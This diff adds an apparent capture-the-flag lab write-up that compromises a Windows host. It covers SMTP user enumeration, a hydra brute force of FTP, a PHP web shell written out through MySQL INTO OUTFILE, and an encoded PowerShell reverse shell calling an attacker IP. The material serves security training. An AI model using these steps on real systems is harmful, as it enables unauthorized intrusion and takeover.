@@ -3008,6 +3008,343 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 <details>
 <summary><h2>Attacking Common Services (EASY)</h2></summary>
 
+We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:
+
+* **HTB{...}**
+
+Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.
+
+<details>
+<summary><h3>1. Enumeration</h3></summary>
+
+I started enumerating the ports, their service version and running the default scripts to have a big picture of my target machine.
+
+```bash 
+nmap -p- -sC -sV -Pn -n 10.129.203.7
+```
+```bash 
+# Nmap scan report for 10.129.203.7
+# Host is up (0.066s latency).
+# Not shown: 65528 filtered tcp ports (no-response)
+# Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+# PORT     STATE SERVICE       VERSION
+# 21/tcp   open  ftp
+# | ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
+# | Not valid before: 2022-04-21T19:27:17
+# |_Not valid after:  2032-04-18T19:27:17
+# |_ssl-date: 2025-09-19T02:49:22+00:00; 0s from scanner time.
+# | fingerprint-strings: 
+# |   GenericLines: 
+# |     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+# |     Command unknown, not supported or not allowed...
+# |     Command unknown, not supported or not allowed...
+# |   NULL: 
+# |_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+# 80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
+# |_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
+# | http-title: Welcome to XAMPP
+# |_Requested resource was http://10.129.203.7/dashboard/
+# 443/tcp  open  ssl/https     Core FTP HTTPS Server
+# | ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
+# | Not valid before: 2022-04-21T19:27:17
+# |_Not valid after:  2032-04-18T19:27:17
+# |_http-server-header: Core FTP HTTPS Server
+# | fingerprint-strings: 
+# |   FourOhFourRequest: 
+# |     HTTP/1.1 401 Unauthorized
+# |     Date:Fri, 19 Aug 2025 02:47:26 GMT
+# |     Server: Core FTP HTTPS Server
+# |     Connection: close
+# |     WWW-Authenticate: Basic realm="Restricted Area"
+# |     Content-Type: text/html
+# |     Content-length: 61
+# |     <BODY>
+# |     <HTML>
+# |     HTTP/1.1 401 Unauthorized
+# |     </BODY>
+# |     </HTML>
+# |   GenericLines, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+# |     Command Not Recognized
+# |   GetRequest: 
+# |     HTTP/1.1 401 Unauthorized
+# |     Date:Fri, 19 Aug 2025 02:47:25 GMT
+# |     Server: Core FTP HTTPS Server
+# |     Connection: close
+# |     WWW-Authenticate: Basic realm="Restricted Area"
+# |     Content-Type: text/html
+# |     Content-length: 61
+# |     <BODY>
+# |     <HTML>
+# |     HTTP/1.1 401 Unauthorized
+# |     </BODY>
+# |_    </HTML>
+# |_ssl-date: 2025-09-19T02:49:21+00:00; 0s from scanner time.
+# 3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
+# | mysql-info: 
+# |   Protocol: 10
+# |   Version: 5.5.5-10.4.24-MariaDB
+# |   Thread ID: 20
+# |   Capabilities flags: 63486
+# |   Some Capabilities: LongColumnFlag, FoundRows, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolOld, IgnoreSigpipes, Support41Auth, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsTransactions, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+# |   Status: Autocommit
+# |   Salt: KzI<.sx%J&}fdElqrg.N
+# |_  Auth Plugin Name: mysql_native_password
+# 3389/tcp open  ms-wbt-server Microsoft Terminal Services
+# | ssl-cert: Subject: commonName=WIN-EASY
+# | Not valid before: 2025-09-18T00:48:49
+# |_Not valid after:  2026-03-20T00:48:49
+# | rdp-ntlm-info: 
+# |   Target_Name: WIN-EASY
+# |   NetBIOS_Domain_Name: WIN-EASY
+# |   NetBIOS_Computer_Name: WIN-EASY
+# |   DNS_Domain_Name: WIN-EASY
+# |   DNS_Computer_Name: WIN-EASY
+# |   Product_Version: 10.0.17763
+# |_  System_Time: 2025-09-19T02:49:02+00:00
+# |_ssl-date: 2025-09-19T02:49:21+00:00; 0s from scanner time.
+
+# Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+# Nmap done: 1 IP address (1 host up) scanned in 253.05 seconds
+```
+
+</details>
+
+<details>
+<summary><h3>2. Identify valid users</h3></summary>
+
+Given that the server's function was described as managing emails, the SMTP service was a logical target for user enumeration. Using the smtp-user-enum tool, I tested a common username list against the server.
+
+```bash 
+smtp-user-enum -M RCPT -U ~/Downloads/users.list -t 10.129.203.7 -D inlanefreight.htb
+```
+```bash 
+# Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+#  ----------------------------------------------------------
+# |                   Scan Information                       |
+#  ----------------------------------------------------------
+
+# Mode ..................... RCPT
+# Worker Processes ......... 5
+# Usernames file ........... /home/htb-ac-1640397/Downloads/users.list
+# Target count ............. 1
+# Username count ........... 79
+# Target TCP port .......... 25
+# Query timeout ............ 5 secs
+# Target domain ............ inlanefreight.htb
+
+######## Scan started at Thu Sep 18 20:23:50 2025 #########
+ 10.129.203.7: <USER>@inlanefreight.htb exists
+######## Scan completed at Thu Sep 18 20:23:56 2025 #########
+1 results.
+
+# 79 queries in 6 seconds (13.2 queries / sec)
+```
+
+This proved successful, confirming the existence of a valid user account: `<USER>`.
+
+</details>
+
+<details>
+<summary><h3>3. Brute Force</h3></summary>
+
+With a valid username, the next objective was to obtain a password. I attempted a password-spraying attack using hydra against several login services.
+
+Initial attempts against FTP (21) and SMTP (25) failed immediately, with the server dropping connections. This indicated the presence of an automated security mechanism designed to block brute-force attacks.
+
+By redirecting a methodical and slow brute-force attack against the FTP service, I was eventually able to identify the correct password for the user.
+
+```bash 
+hydra -l <USER> -P /usr/share/wordlists/rockyou.txt  -t 1 10.129.203.7 ftp -vV
+```
+```bash 
+# Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+# Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-18 21:00:12
+
+# [DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
+# [DATA] attacking ftp://10.129.203.7:21/
+# [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+# [ATTEMPT] target 10.129.203.7 - login "<USER>" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+# [ATTEMPT] target 10.129.203.7 - login "<USER>" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+...
+[ATTEMPT] target 10.129.203.7 - login "<USER>" - pass "<PASSWORD>" - 82 of 14344436 [child 3] (0/37)
+[21][ftp] host: 10.129.203.7   login: <USER>   password: <PASSWORD>
+# [STATUS] attack finished for 10.129.203.7 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+# Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-18 21:00:54
+```
+
+</details>
+
+<details>
+<summary><h3>4. Access the services</h3></summary>
+
+Upon gaining access to the FTP server with the compromised credentials, I proceeded with internal enumeration. I resolved a common FTP client issue with the ls command by adjusting the connection mode, which then allowed for directory listing.
+
+```bash 
+ftp 10.129.203.7
+```
+```bash 
+# Connected to 10.129.203.7.
+# 220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+Name (10.129.203.7:root): <USER>
+# 331 password required for <USER>
+Password: <PASSWORD>
+# 230-Logged on
+# 230 
+# Remote system type is UNIX.
+# Using binary mode to transfer files.
+ftp> passive
+# Passive mode: off; fallback to active mode: off.
+ftp> ls
+# 200 PORT command successful
+# 150 Opening ASCII mode data connection
+# -r-xr-xrwx   1 owner    group              55 Apr 21  2022      docs.txt
+# -r-xr-xrwx   1 owner    group             255 Apr 22  2022      WebServersInfo.txt
+# 226 Transfer Complete
+ftp> get docs.txt
+# local: docs.txt remote: docs.txt
+# 200 PORT command successful
+# 150 RETR command started
+#     55       24.44 KiB/s 
+# 226 Transfer Complete
+# 55 bytes received in 00:00 (1.30 KiB/s)
+ftp> get WebServersInfo.txt
+# local: WebServersInfo.txt remote: WebServersInfo.txt
+# 200 PORT command successful
+# 150 RETR command started
+#    255        2.58 MiB/s 
+# 226 Transfer Complete
+# 255 bytes received in 00:00 (6.21 KiB/s)
+ftp> quit
+# 221-
+# 221 Goodbye
+```
+
+```bash 
+cat docs.txt
+# I'm testing the FTP using HTTPS, everything looks good.
+```
+```bash 
+cat WebServersInfo.txt 
+# CoreFTP:
+# Directory C:\CoreFTP
+# Ports: 21 & 443
+# Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt
+
+# Apache
+# Directory "C:\xampp\htdocs\"
+# Ports: 80 & 4443
+# Test Command: curl http://localhost/test.php
+```
+```bash 
+curl -k -H “Host: localhost” – basic -u <USER>:<PASSWORD> https://10.129.203.7/docs.txt
+# curl: (6) Could not resolve host: xn--localhost-tc0e
+# curl: (6) Could not resolve host: xn--7ug
+# curl: (6) Could not resolve host: basic
+# I'm testing the FTP using HTTPS, everything looks good.
+```
+```bash 
+curl http://10.129.203.7/test.php
+# Hello World!
+```
+
+```bash 
+mysql -h 10.129.203.7 -u <USER> -p
+
+# Enter password: 
+# Welcome to the MariaDB monitor.  Commands end with ; or \g.
+# Your MariaDB connection id is 27
+# Server version: 10.4.24-MariaDB mariadb.org binary distribution
+
+# Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+# Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+# MariaDB [(none)]>
+```
+
+</details>
+
+<details>
+<summary><h3>5. Reverse Shell</h3></summary>
+
+I have two key pieces of information:
+
+* Write access to the FTP server as `<USER>`.
+* The directory of the Apache web server is "C:\xampp\htdocs\".
+
+The goal now is to use the FTP access to upload a web shell into the Apache directory so I can execute commands on the server.
+
+```bash 
+MariaDB [(none)]> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
+# Query OK, 1 row affected (0.068 sec)
+```
+
+```bash 
+curl "http://10.129.203.7/shell.php?cmd=whoami"
+# nt authority\system
+```
+
+```bash 
+sudo nc -lvnp 4444
+```
+
+```bash 
+nano rev.ps1
+```
+```ps1 
+$client = New-Object System.Net.Sockets.TCPClient("10.10.15.130",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+```bash 
+iconv -t UTF-16LE rev.ps1 | base64 -w 0
+# JABjAGwAaQB...AoACkACgA=
+```
+```bash 
+curl "http://10.129.203.7/shell.php?cmd=powershell%20-e%20JABjAGwAaQB...AoACkACgA="
+```
+
+```bash 
+sudo nc -lvnp 4444
+# listening on [any] 4444 ...
+# connect to [10.10.15.130] from (UNKNOWN) [10.129.203.7] 49682
+whoami
+# nt authority\system
+
+PS C:\xampp\htdocs> ls
+# Directory: C:\xampp\htdocs
+
+# Mode                LastWriteTime         Length Name                                                                  
+# ----                -------------         ------ ----                                                                  
+# d-----        4/22/2022   9:17 AM                dashboard                                                             
+# d-----        4/22/2022   9:17 AM                img                                                                   
+# d-----        4/22/2022   9:16 AM                webalizer                                                             
+# d-----        4/22/2022   9:17 AM                xampp                                                                 
+# -a----        8/27/2019   9:02 AM           3607 applications.html                                                     
+# -a----        8/27/2019   9:02 AM            177 bitnami.css                                                           
+# -a----        7/16/2015  10:32 AM          30894 favicon.ico                                                           
+# -a----        7/16/2015  10:32 AM            260 index.php                                                             
+# -a----        9/18/2025  10:02 PM             31 shell.php                                                             
+# -a----        4/22/2022  10:02 AM             29 test.php                                                              
+
+PS C:\xampp> cd C:\Users\Administrator\Desktop
+PS C:\Users\Administrator\Desktop> ls
+
+# Directory: C:\Users\Administrator\Desktop
+
+# Mode                LastWriteTime         Length Name                                                                  
+# ----                -------------         ------ ----                                                                  
+# -a----        4/22/2022  10:36 AM             39 flag.txt                                                              
+
+PS C:\Users\Administrator\Desktop> cat flag.txt
+# <FLAG>
+```
+
+</details>
+
 </details>
 
 <details>
